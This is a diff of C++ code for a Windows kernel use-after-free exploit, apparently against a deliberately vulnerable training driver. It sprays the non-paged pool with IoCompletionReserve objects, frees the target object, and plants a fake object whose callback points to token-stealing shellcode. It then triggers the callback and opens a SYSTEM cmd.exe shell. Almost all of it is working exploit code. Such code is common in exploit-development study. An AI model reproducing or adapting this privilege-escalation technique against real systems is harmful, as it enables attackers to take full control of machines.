@@ -3,31 +3,8 @@
 #include "winternl.h"
 
 #include "Solutions.h"
-#include "ioctal_codes.h"
 #include "utils.h"
-
-using namespace std;
-
-enum class Commands {
-	AllocateUAFObject,
-	FreeUAFObject,
-	AllocateFakeObject,
-	UseUafObject
-};
-
-typedef struct UAFStruct {
-	INT callback;
-	CHAR buf[0x54];
-} UAFStruct;
-
-typedef NTSTATUS(WINAPI* NtAllocateReserveObject_t) (
-	OUT PHANDLE hObject,
-	IN POBJECT_ATTRIBUTES ObjectAttributes,
-	IN DWORD ObjectType);
-
-NTSTATUS Command(HANDLE deviceHandle, Commands operate);
-NTSTATUS SprayHeap();
-DWORD getIoctl(Commands operate);
+#include "UAFNonPagedPool.h"
 
 NTSTATUS Solutions::TriggerUAF() {
 	
@@ -42,43 +19,44 @@ NTSTATUS Solutions::TriggerUAF() {
 	}
 
 	if (!NT_SUCCESS(Command(_hDeviceHandle, Commands::AllocateUAFObject))) {
-		cout << "[-] Could not allocate UAF object" << endl;
+		std::cout << "[-] Could not allocate UAF object" << std::endl;
 		return STATUS_INVALID_PARAMETER;
 	}
-	cout << "[+] Allocated UAF object" << endl;
-
-	if (!NT_SUCCESS(Command(_hDeviceHandle, Commands::FreeUAFObject))) {
-		cout << "[-] Could not free UAF object" << endl;
-		return STATUS_INVALID_PARAMETER;
-	}
-	cout << "[+] Freed UAF object" << endl;
+	std::cout << "[+] Allocated UAF object" << std::endl;
 
 	DWORD dwBytesReturned = 0;
 	UAFStruct* lpInBuffer = (UAFStruct*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(UAFStruct));
 	if (!lpInBuffer) {
-		cout << "[-] Could not allocate buffer" << endl;
+		std::cout << "[-] Could not allocate buffer" << std::endl;
 		return STATUS_NO_MEMORY;
 	}
 
-	lpInBuffer->callback = (ULONG)&tokenStealingShellcodeWriteWhatWhere;
+	lpInBuffer->callback = (ULONG)&token_stealing_shellcode_write_what_where;
 	memset(lpInBuffer->buf, 0x41, 0x54);
-	cout << "[+] token stealing shellcode " << hex << (ULONG)&tokenStealingShellcodeWriteWhatWhere << endl;
+
+	std::cout << "Freeing UAF object" << std::endl;
+	if (!NT_SUCCESS(Command(_hDeviceHandle, Commands::FreeUAFObject))) {
+		std::cout << "[-] Could not free UAF object" << std::endl;
+		return STATUS_INVALID_PARAMETER;
+	}
 	
+	// minimum actions between the freeing and the allocation of the fake object
+
 	if (!DeviceIoControl(_hDeviceHandle, IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED,
 		(PVOID)lpInBuffer, sizeof(UAFStruct), NULL, NULL, &dwBytesReturned, NULL)) {
-		cout << "[-] Could not talk with the driver" << endl;
+		std::cout << "[-] Could not talk with the driver" << std::endl;
 		return STATUS_INVALID_PARAMETER;
 	}
-	cout << "[+] Allocated fake object" << endl;
+	std::cout << "[+] Allocated fake object" << std::endl;
 	
 	if (!NT_SUCCESS(Command(_hDeviceHandle, Commands::UseUafObject))) {
-		cout << "[-] Could not use UAF object" << endl;
+		std::cout << "[-] Could not use UAF object" << std::endl;
 		return STATUS_INVALID_PARAMETER;
 	}
-	cout << "[+] Calling UAF callback -- enjoy system :)" << endl;
-
+	std::cout << "[+] Calling UAF callback -- enjoy system :)" << std::endl;
+	
 	system("cmd.exe");
-
+	
 	return 0;
 }
 
@@ -103,31 +81,34 @@ static NTSTATUS SprayHeap() {
 																				"NtAllocateReserveObject");
 	
 	if (!NtAllocateReserveObject) {
-		cout << "[-] Could not load NtAllocateResearveObject - " << GetLastError() << endl;
+		std::cout << "[-] Could not load NtAllocateResearveObject - " << GetLastError() << std::endl;
 		return STATUS_DLL_NOT_FOUND;
 	}
 
 	NTSTATUS status = 0;
 	PHANDLE hIoCo = (PHANDLE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, hArrSize * sizeof(HANDLE));
 	if (!hIoCo) {
-		cout << "[-] Could not allocate buffer" << endl;
+		std::cout << "[-] Could not allocate buffer" << std::endl;
 		return STATUS_NO_MEMORY;
 	}
 
-	cout << "[+] Spraying non paged pool with IoCo objects" << endl;
+	std::cout << "[+] Spraying non paged pool with IoCo objects" << std::endl;
 	for (int i = 0; i < 8000 + 5000; i++) {
 		status = NtAllocateReserveObject(&hIoCo[i], NULL, 1); // 1 = IoCo - > IoCompletionReserve 
+		
 		if (!NT_SUCCESS(status)) {
-			cout << "[-] Could not allocate IoCo object - " << GetLastError() << endl;
+			std::cout << "[-] Could not allocate IoCo object - " << GetLastError() << std::endl;
 			return STATUS_NO_MEMORY;
 		}
 	}
 
-	cout << "[+] Creating holes in the pool" << endl;
-	BOOLEAN shouldFree = true;
-	for (int i = 8000; i < 13000; i++) {
-		shouldFree && CloseHandle(hIoCo[i]);
-		shouldFree = !shouldFree;
+	std::cout << "[+] Creating holes in the pool" << std::endl;
+	for (int i = 8000; i < 13000; i+=2) {
+		CloseHandle(hIoCo[i]);
+
+		if (i > 12990) {
+			std::cout << hIoCo[i + 1] << std::endl;
+		}
 	}
 
 	return 0; // STATUS_SUCCESS
